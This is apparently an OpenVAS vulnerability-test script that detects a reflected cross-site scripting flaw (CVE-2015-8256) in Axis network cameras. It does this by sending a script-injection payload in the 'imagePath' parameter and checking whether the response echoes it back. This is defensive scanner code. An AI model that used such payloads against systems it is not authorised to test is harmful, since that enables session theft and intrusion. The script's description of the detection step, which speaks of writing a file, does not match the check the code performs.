###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_axis_network_cameras_mult_xss_vuln.nasl 7174 2017-09-18 11:48:08Z asteins $
#
# Axis Network Cameras Multiple Cross-site Scripting Vulnerabilities 
#
# Authors:
# Kashinath T <tkashinath@secpod.com>
#
# Copyright:
# Copyright (C) 2016 Greenbone Networks GmbH http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.807676");
  script_version("$Revision: 7174 $");
  script_cve_id("CVE-2015-8256");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2017-09-18 13:48:08 +0200 (Mon, 18 Sep 2017) $");
  script_tag(name:"creation_date", value:"2016-04-20 15:15:28 +0530 (Wed, 20 Apr 2016)");
  script_name("Axis Network Cameras Multiple Cross-site Scripting Vulnerabilities");

  script_tag(name:"summary", value:"The host is running Axis Network Cameras and is
  prone to multiple cross-site scripting vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send a crafted HTTP GET request and check
  whether it is possible to write a file into the server.");

  script_tag(name:"insight", value:"The flaws exist due to an improper sanitization
  of 'imagePath' parameter in'view.shtml' script.");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to
  run arbitrary code on a victim's browser and computer if combined with another
  flaws in the same devices.

  Impact Level: Application");

  script_tag(name:"affected", value:"Multiple Axis Network products.");

  script_tag(name:"solution", value:"No solution or patch was made available for at least one year since disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.
");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_tag(name:"qod_type", value:"remote_vul");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/39683");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning"); 
  exit(0);
}

## The script code starts here

include("http_func.inc");
include("http_keepalive.inc");

## Variable initialization
url = "";
axis_port = "";
req = "";
buf = "";

## Get HTTP Port
axis_port = get_http_port(default:80);
if(!axis_port){
  exit(0);
}

## send request and receive response
req = http_get(item:"/view/view.shtml", port:axis_port);
res = http_send_recv(port:axis_port, data:req);

## Confirm application
if(res && ">Live view  - AXIS" >< res && "Camera<" >< res)
{
  ## Construct vulnerable url
  url = '/view/view.shtml?imagePath=0WLL</script><script>alert' +
        '(document.cookie)</script><!--';

  ##Send Request and check vulnerability
  if(http_vuln_check(port:axis_port, url:url, check_header:TRUE,
                     pattern:"<script>alert\(document.cookie\)</script>",
                     extra_check:make_list("Live view  - AXIS", "camera")))
  {
    report = report_vuln_url(port:axis_port, url:url);
    security_message(port:axis_port, data:report);
    exit(0);
  }
}
